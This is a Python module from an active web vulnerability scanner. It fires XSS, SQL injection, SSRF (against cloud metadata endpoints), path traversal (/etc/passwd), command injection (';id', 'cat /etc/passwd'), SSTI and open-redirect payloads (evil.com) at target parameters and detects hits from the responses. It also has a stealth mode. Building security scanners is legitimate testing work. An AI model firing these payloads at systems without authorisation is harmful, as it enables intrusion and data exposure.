#!/usr/bin/env python3
"""
CSCAN — Active Web Vulnerability Tester (v3 — Crawler-Aware)
Tests for: XSS, SQLi (error + time-based), SSRF, Open Redirect,
           Path Traversal, Command Injection, IDOR hints.

v3: Now uses REAL forms and parameters discovered by the crawler,
    instead of guessing parameter names on the homepage.
    Falls back to parameter guessing only if no crawl data is provided.
"""

import os
import re
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules.stealth import StealthSession
from modules.ui import (
    section, ok, warn, alert, info, critical, bold, divider,
    progress_bar, G, R, Y, C, M, W, BR, DM, RS
)

WORDLISTS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'wordlists')

_stealth_session = None
_insecure_ssl    = False
TIMEOUT          = 8


def set_stealth_session(s: StealthSession):
    global _stealth_session
    _stealth_session = s


def set_insecure_ssl(flag: bool):
    global _insecure_ssl
    _insecure_ssl = flag


# ── HTTP helpers ──────────────────────────────────────────────────────────────
def _get(url, params=None, timeout=TIMEOUT, allow_redirects=True, cookies=None):
    try:
        kw = {'params': params, 'timeout': timeout, 'allow_redirects': allow_redirects}
        if cookies:
            kw['cookies'] = cookies
        if _stealth_session:
            return _stealth_session.get(url, **kw)
        return requests.get(url, verify=not _insecure_ssl,
                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                            **kw)
    except Exception:
        return None


def _post(url, data=None, timeout=TIMEOUT, cookies=None):
    try:
        kw = {'data': data, 'timeout': timeout}
        if cookies:
            kw['cookies'] = cookies
        if _stealth_session:
            return _stealth_session.post(url, **kw)
        return requests.post(url, verify=not _insecure_ssl,
                             headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                             **kw)
    except Exception:
        return None


def _build_url(target: str) -> str:
    if target.startswith(('http://', 'https://')):
        return target.rstrip('/')
    return f"http://{target.rstrip('/')}"


# ── Load payloads from wordlists (with fallback) ─────────────────────────────
def _load_payloads(filename: str, fallback: list) -> list:
    path = os.path.join(WORDLISTS_DIR, filename)
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            return lines if lines else fallback
    except Exception:
        return fallback


# ── XSS ──────────────────────────────────────────────────────────────────────
_XSS_FALLBACK = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '"><iframe src="javascript:alert(1)">',
    '<img src=x onerror=alert`1`>',
    '"><svg/onload=alert(1)//',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
    '{{7*7}}',  # SSTI probe
    '${7*7}',   # Template injection
]

XSS_REFLECTION_PATTERNS = [
    re.compile(r'<script>alert\(1\)</script>', re.I),
    re.compile(r'onerror=alert\(1\)', re.I),
    re.compile(r'onload=alert\(1\)', re.I),
    re.compile(r'<svg\s+onload', re.I),
    re.compile(r'<iframe\s+src="javascript:', re.I),
    re.compile(r'ontoggle=alert\(1\)', re.I),
    re.compile(r'alert`1`', re.I),
    re.compile(r'\b49\b'),  # 7*7 = 49 (SSTI check)
]

# Fallback param names if no crawl data
FALLBACK_PARAMS = ['q', 'search', 'id', 'name', 'query', 'keyword', 'input',
                   'term', 'page', 'url', 'file', 'path', 'redirect', 'next',
                   'callback', 'return', 'view', 'action', 'type', 'cat',
                   'dir', 'ref', 'msg', 'email', 'user', 'username', 'login']


def _test_xss(target_url: str, params: list, cookies: dict = None) -> list:
    """Test XSS on discovered parameters."""
    payloads = _load_payloads('xss_payloads.txt', _XSS_FALLBACK)
    # Use top 50 payloads max for speed
    payloads = payloads[:50]
    findings = []

    for param in params:
        for payload in payloads:
            r = _get(target_url, params={param: payload}, cookies=cookies)
            if r and r.text:
                for pat in XSS_REFLECTION_PATTERNS:
                    if pat.search(r.text):
                        findings.append({
                            'type': 'Reflected XSS',
                            'severity': 'HIGH',
                            'param': param,
                            'payload': payload,
                            'url': r.url,
                            'evidence': pat.pattern[:60],
                        })
                        return findings  # stop on first confirmed hit per endpoint
    return findings


def _test_xss_form(form: dict, cookies: dict = None) -> list:
    """Test XSS on a specific HTML form using POST."""
    payloads = _load_payloads('xss_payloads.txt', _XSS_FALLBACK)[:30]
    findings = []
    action = form.get('action', '')
    method = form.get('method', 'GET')
    param_names = form.get('all_param_names', [])

    if not param_names or not action:
        return []

    for payload in payloads:
        data = {}
        for p in param_names:
            data[p] = payload  # inject into all fields

        if method == 'POST':
            r = _post(action, data=data, cookies=cookies)
        else:
            r = _get(action, params=data, cookies=cookies)

        if r and r.text:
            for pat in XSS_REFLECTION_PATTERNS:
                if pat.search(r.text):
                    findings.append({
                        'type': 'Reflected XSS (Form)',
                        'severity': 'HIGH',
                        'param': ', '.join(param_names[:3]),
                        'payload': payload,
                        'url': action,
                        'method': method,
                        'evidence': pat.pattern[:60],
                    })
                    return findings
    return findings


# ── SQL Injection ─────────────────────────────────────────────────────────────
_SQLI_FALLBACK = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1' AND SLEEP(0)--",
    "1; SELECT 1--",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "') OR ('1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"(sql syntax|mysql_fetch|ORA-\d{4,}|SQLSTATE|syntax error|unclosed quotation|"
               r"pg_query|unterminated string|quoted string not properly terminated|"
               r"Microsoft OLE DB|ODBC SQL Server|SQLite3::query|"
               r"Warning.*mysql_|PostgreSQL.*ERROR|"
               r"com\.mysql\.jdbc|org\.postgresql\.util)", re.I),
]

SQLI_TIME_PAYLOAD = "1' AND SLEEP(4)--"
SQLI_TIME_THRESHOLD = 3.5


def _test_sqli(target_url: str, params: list, cookies: dict = None) -> list:
    """Test SQL injection on discovered parameters."""
    payloads = _load_payloads('sqli_payloads.txt', _SQLI_FALLBACK)[:80]
    findings = []

    # Error-based
    for param in params:
        for payload in payloads:
            r = _get(target_url, params={param: payload}, cookies=cookies)
            if r and r.text:
                for pat in SQLI_ERROR_PATTERNS:
                    if pat.search(r.text):
                        findings.append({
                            'type': 'SQL Injection (Error-Based)',
                            'severity': 'CRITICAL',
                            'param': param,
                            'payload': payload,
                            'url': r.url,
                            'evidence': pat.search(r.text).group(0)[:80],
                        })
                        return findings

    # Boolean-based blind (compare response sizes)
    for param in params[:5]:
        r_true = _get(target_url, params={param: "1 AND 1=1"}, cookies=cookies)
        r_false = _get(target_url, params={param: "1 AND 1=2"}, cookies=cookies)
        if r_true and r_false:
            if r_true.status_code == r_false.status_code == 200:
                size_diff = abs(len(r_true.text) - len(r_false.text))
                if size_diff > 50 and len(r_true.text) > 100:
                    findings.append({
                        'type': 'SQL Injection (Boolean Blind - Possible)',
                        'severity': 'HIGH',
                        'param': param,
                        'payload': '1 AND 1=1 vs 1 AND 1=2',
                        'url': target_url,
                        'evidence': f'Response size diff: {size_diff}B (true={len(r_true.text)}B, false={len(r_false.text)}B)',
                    })

    # Time-based blind (check primary params only — expensive)
    for param in params[:3]:
        try:
            start = time.time()
            r = _get(target_url, params={param: SQLI_TIME_PAYLOAD}, timeout=10, cookies=cookies)
            elapsed = time.time() - start
            if elapsed >= SQLI_TIME_THRESHOLD:
                # Confirm: run without SLEEP to rule out slow server
                start2 = time.time()
                _get(target_url, params={param: "1"}, timeout=10, cookies=cookies)
                baseline = time.time() - start2
                if elapsed > baseline + 3.0:
                    findings.append({
                        'type': 'SQL Injection (Time-Based Blind)',
                        'severity': 'CRITICAL',
                        'param': param,
                        'payload': SQLI_TIME_PAYLOAD,
                        'url': target_url,
                        'evidence': f'Delayed {elapsed:.1f}s vs baseline {baseline:.1f}s',
                    })
        except Exception:
            pass

    return findings


def _test_sqli_form(form: dict, cookies: dict = None) -> list:
    """Test SQLi on a specific HTML form."""
    payloads = _load_payloads('sqli_payloads.txt', _SQLI_FALLBACK)[:30]
    findings = []
    action = form.get('action', '')
    method = form.get('method', 'GET')
    param_names = form.get('all_param_names', [])

    if not param_names or not action:
        return []

    for payload in payloads:
        for target_param in param_names:
            data = {p: 'test' for p in param_names}
            data[target_param] = payload

            if method == 'POST':
                r = _post(action, data=data, cookies=cookies)
            else:
                r = _get(action, params=data, cookies=cookies)

            if r and r.text:
                for pat in SQLI_ERROR_PATTERNS:
                    if pat.search(r.text):
                        findings.append({
                            'type': 'SQL Injection (Error-Based via Form)',
                            'severity': 'CRITICAL',
                            'param': target_param,
                            'payload': payload,
                            'url': action,
                            'method': method,
                            'evidence': pat.search(r.text).group(0)[:80],
                        })
                        return findings
    return findings


# ── Open Redirect ─────────────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    'https://evil.com', '//evil.com', '/\\evil.com',
    'https%3A%2F%2Fevil.com', 'https://evil.com/.example.com',
    '////evil.com', 'https:evil.com', '〱evil.com',
    'https://evil.com@example.com',
]
REDIRECT_PARAMS = ['next', 'redirect', 'url', 'return', 'goto', 'dest',
                   'destination', 'return_to', 'redir', 'continue',
                   'forward', 'target', 'to', 'out', 'view', 'ref']


def _test_open_redirect(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    # Combine discovered params with known redirect param names
    test_params = list(set(params + REDIRECT_PARAMS))

    for param in test_params:
        for payload in REDIRECT_PAYLOADS[:4]:
            r = _get(base_url, params={param: payload}, allow_redirects=False, cookies=cookies)
            if r and r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get('Location', '')
                if 'evil.com' in loc:
                    findings.append({
                        'type': 'Open Redirect',
                        'severity': 'MEDIUM',
                        'param': param,
                        'payload': payload,
                        'location': loc,
                        'url': r.url,
                    })
                    return findings
    return findings


# ── SSRF ──────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/',
    'http://169.254.169.254/metadata/v1/',
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://0177.0.0.1/',        # octal
    'http://2130706433/',          # decimal
    'http://127.1/',
]
SSRF_PARAMS = ['url', 'src', 'fetch', 'load', 'path', 'img', 'file', 'data',
               'proxy', 'uri', 'href', 'link', 'source', 'image', 'domain']
SSRF_EVIDENCE = re.compile(r'(ami-id|instance-id|account-id|computeMetadata|metadata\.google|127\.0\.0\.1|localhost|root:x:0)', re.I)


def _test_ssrf(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + SSRF_PARAMS))

    for param in test_params:
        for payload in SSRF_PAYLOADS[:5]:
            r = _get(base_url, params={param: payload}, timeout=6, cookies=cookies)
            if r and r.text and SSRF_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': SSRF_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
    '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/etc/passwd', '..%252f..%252f..%252fetc/passwd',
    '....\\....\\....\\etc\\passwd', '..%c0%af..%c0%afetc/passwd',
    '..%00/..%00/..%00/etc/passwd',
]
PATH_PARAMS = ['file', 'path', 'doc', 'page', 'template', 'include', 'view',
               'content', 'folder', 'dir', 'document', 'root', 'load']
PATH_EVIDENCE = re.compile(r'(root:x:0:0:|daemon:|bin:|nobody:|\\[extensions\\]|; for 16-bit)', re.I)


def _test_path_traversal(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + PATH_PARAMS))

    for param in test_params:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            r = _get(base_url, params={param: payload}, cookies=cookies)
            if r and r.text and PATH_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Path Traversal (LFI)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': PATH_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    ';id', '|id', '`id`', '$(id)', '; whoami', '| whoami',
    '& whoami', '|| whoami', ';cat /etc/passwd',
    '| cat /etc/passwd', '`cat /etc/passwd`',
]
CMD_PARAMS = ['cmd', 'exec', 'command', 'run', 'ping', 'host', 'ip',
              'process', 'execute', 'system', 'do']
CMD_EVIDENCE = re.compile(r'(uid=\d+\(|root\:|daemon\:|www-data\:|nobody\:|root:x:0)', re.I)


def _test_cmdi(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    test_params = list(set(params + CMD_PARAMS))

    for param in test_params:
        for payload in CMD_PAYLOADS:
            r = _get(base_url, params={param: payload}, cookies=cookies)
            if r and r.text and CMD_EVIDENCE.search(r.text):
                findings.append({
                    'type': 'Command Injection (RCE)',
                    'severity': 'CRITICAL',
                    'param': param,
                    'payload': payload,
                    'url': r.url,
                    'evidence': CMD_EVIDENCE.search(r.text).group(0),
                })
                return findings
    return findings


# ── SSTI (Server-Side Template Injection) ─────────────────────────────────────
SSTI_PAYLOADS = [
    ('{{7*7}}', '49'),
    ('${7*7}', '49'),
    ('<%= 7*7 %>', '49'),
    ('{{7*\'7\'}}', '7777777'),
    ('${T(java.lang.Runtime).getRuntime()}', 'java.lang.Runtime'),
]


def _test_ssti(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    for param in params[:10]:
        for payload, expected in SSTI_PAYLOADS:
            r = _get(base_url, params={param: payload}, cookies=cookies)
            if r and r.text and expected in r.text:
                # Verify it's not just echoing the payload
                if payload not in r.text:
                    findings.append({
                        'type': 'Server-Side Template Injection (SSTI)',
                        'severity': 'CRITICAL',
                        'param': param,
                        'payload': payload,
                        'url': r.url,
                        'evidence': f'Expected "{expected}" found in response',
                    })
                    return findings
    return findings


# ── IDOR Hint Detection ───────────────────────────────────────────────────────
def _test_idor_hint(base_url: str, params: list, cookies: dict = None) -> list:
    findings = []
    # Look for numeric ID parameters specifically
    id_params = [p for p in params if any(x in p.lower() for x in
                 ('id', 'uid', 'user_id', 'account', 'order', 'invoice', 'num', 'pid'))]

    for param in id_params[:5]:
        r1 = _get(base_url, params={param: '1'}, cookies=cookies)
        r2 = _get(base_url, params={param: '2'}, cookies=cookies)
        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
            if r1.text != r2.text and len(r1.text) > 100 and len(r2.text) > 100:
                # Additional check: both should have different meaningful content
                size_diff = abs(len(r1.text) - len(r2.text))
                # Only flag if content meaningfully differs
                if size_diff < len(r1.text) * 0.9:
                    findings.append({
                        'type': 'Potential IDOR',
                        'severity': 'MEDIUM',
                        'param': param,
                        'url': base_url,
                        'evidence': f'?{param}=1 ({len(r1.text)}B) vs ?{param}=2 ({len(r2.text)}B) — different content, same endpoint',
                    })
    return findings


# ── Main Entry Point ──────────────────────────────────────────────────────────
def active_vuln_scan(target: str, use_ssl: bool = False,
                     crawl_data: dict = None, cookies: dict = None) -> dict:
    """
    Active vulnerability scanner.
    If crawl_data is provided (from modules.crawler), tests are run against
    REAL discovered endpoints and parameters. Otherwise falls back to guessing.
    """
    section("ACTIVE WEB VULNERABILITY SCANNER")
    base = _build_url(target)
    if use_ssl and base.startswith('http://'):
        base = 'https://' + base[7:]

    info(f"Target        : {BR}{W}{base}{RS}")
    warn("Active mode — payloads will be sent to the target.")
    warn("Only use on systems you own or have written permission to test.\n")

    # Determine test targets from crawl data or fallback
    test_targets = []
    if crawl_data and crawl_data.get('parameters'):
        discovered_params = list(crawl_data['parameters'].keys())
        ok(f"Using {len(discovered_params)} parameters from crawler")

        # Build test targets from crawled pages that have parameters
        tested_urls = set()
        for param, urls in crawl_data['parameters'].items():
            for url in (urls if isinstance(urls, list) else [urls]):
                if url not in tested_urls:
                    tested_urls.add(url)
                    # Collect all params for this URL
                    url_params = [p for p, u_list in crawl_data['parameters'].items()
                                  if url in (u_list if isinstance(u_list, list) else [u_list])]
                    test_targets.append({'url': url, 'params': url_params})

        # Also add form-based targets
        forms = crawl_data.get('forms', [])
        if forms:
            ok(f"Using {len(forms)} forms from crawler")

        # Also test JS-discovered endpoints
        js_endpoints = crawl_data.get('js_endpoints', [])
        if js_endpoints:
            info(f"Also testing {len(js_endpoints)} JS-discovered endpoints")
            for ep in js_endpoints[:20]:
                test_targets.append({'url': ep, 'params': FALLBACK_PARAMS[:10]})
    else:
        warn("No crawl data — falling back to parameter guessing (less effective)")
        warn("Run the Web Crawler first for better results!\n")
        test_targets = [{'url': base, 'params': FALLBACK_PARAMS}]
        forms = []

    if not test_targets:
        test_targets = [{'url': base, 'params': FALLBACK_PARAMS}]
        forms = crawl_data.get('forms', []) if crawl_data else []

    # Cap targets to avoid excessive scanning
    test_targets = test_targets[:30]
    info(f"Testing       : {len(test_targets)} endpoint(s)\n")

    test_suite = [
        ('XSS (Reflected)',        _test_xss),
        ('SQL Injection',          _test_sqli),
        ('Open Redirect',          _test_open_redirect),
        ('SSRF',                   _test_ssrf),
        ('Path Traversal / LFI',   _test_path_traversal),
        ('Command Injection',       _test_cmdi),
        ('SSTI',                    _test_ssti),
        ('IDOR Hint',              _test_idor_hint),
    ]

    all_findings = []
    total_tests = len(test_suite) * len(test_targets)
    done = 0

    for target_info in test_targets:
        url = target_info['url']
        params = target_info['params']

        for name, fn in test_suite:
            done += 1
            progress_bar(done, total_tests, f'{name} on {url[-30:]}')
            try:
                hits = fn(url, params, cookies=cookies)
                all_findings.extend(hits)
            except Exception:
                pass

    # Test forms (POST-based)
    if crawl_data:
        forms = crawl_data.get('forms', [])
        for i, form in enumerate(forms[:15]):
            progress_bar(i + 1, min(len(forms), 15), 'form testing')
            try:
                all_findings.extend(_test_xss_form(form, cookies=cookies))
                all_findings.extend(_test_sqli_form(form, cookies=cookies))
            except Exception:
                pass

    print('\n')
    divider()

    if not all_findings:
        ok("No active vulnerabilities detected in this scan round.")
        if not crawl_data:
            info("Tip: Run the Web Crawler first — it discovers real parameters to test.")
        else:
            info("Note: Custom or encoded parameters may still be vulnerable.")
    else:
        # Deduplicate findings
        seen = set()
        unique_findings = []
        for f in all_findings:
            key = (f['type'], f.get('param', ''), f.get('url', ''))
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)
        all_findings = unique_findings

        for f in all_findings:
            sev = f.get('severity', 'INFO')
            col = R if sev == 'CRITICAL' else (Y if sev in ('HIGH', 'MEDIUM') else C)
            print(f"  {BR}{col}[{sev}]{RS}  {BR}{W}{f['type']}{RS}")
            print(f"         {DM}Param   :{RS} {f.get('param', 'N/A')}")
            print(f"         {DM}Payload :{RS} {f.get('payload', 'N/A')[:60]}")
            if f.get('evidence'):
                print(f"         {DM}Evidence:{RS} {f['evidence'][:80]}")
            print(f"         {DM}URL     :{RS} {f.get('url', base)[:80]}")
            if f.get('method'):
                print(f"         {DM}Method  :{RS} {f['method']}")
            print()

        crits = [f for f in all_findings if f.get('severity') == 'CRITICAL']
        highs = [f for f in all_findings if f.get('severity') == 'HIGH']
        if crits:
            critical(f"{len(crits)} CRITICAL vulnerability(ies) confirmed! Immediate remediation required.")
        if highs:
            alert(f"{len(highs)} HIGH severity finding(s) — review promptly.")

    return {'findings': all_findings, 'total': len(all_findings)}
